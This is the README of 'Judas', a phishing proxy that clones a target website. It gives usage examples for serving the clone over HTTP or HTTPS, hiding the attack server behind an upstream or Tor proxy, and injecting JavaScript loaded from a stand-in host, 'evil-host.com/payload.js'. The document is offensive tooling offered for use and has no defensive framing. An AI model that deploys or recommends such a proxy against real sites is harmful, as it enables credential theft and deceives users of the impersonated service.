Judas
=====
Judas is a phishing proxy.
It can clone a website passed to it using command line flags.

Usage
-----
The target ```--target``` flag is required.
By default, Judas requires a path to a SSL certificate (```--cert```) and a SSL private key (```--private-key```).
If you want to listen using HTTP, pass the ```--insecure``` flag.

Example:
```
./proxy --target https://target-url.com --cert server.crt --private-key server.key
```

```
./proxy --target https://target-url.com --insecure
```

It can optionally use an upstream proxy with the ```--proxy``` argument to proxy Tor websites or hide the attack server from the target.

Example:
```
./proxy --target https://torwebsite.onion --proxy localhost:9150
```

By default, Judas listens on localhost:8080.
To change this, use the ```--address``` argument.

Example:
```
./proxy --target https://target-url.com --address=0.0.0.0:8080
```

Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```--inject-js``` argument.

Example:
```
./proxy --target https://target-url.com --inject-js https://evil-host.com/payload.js
```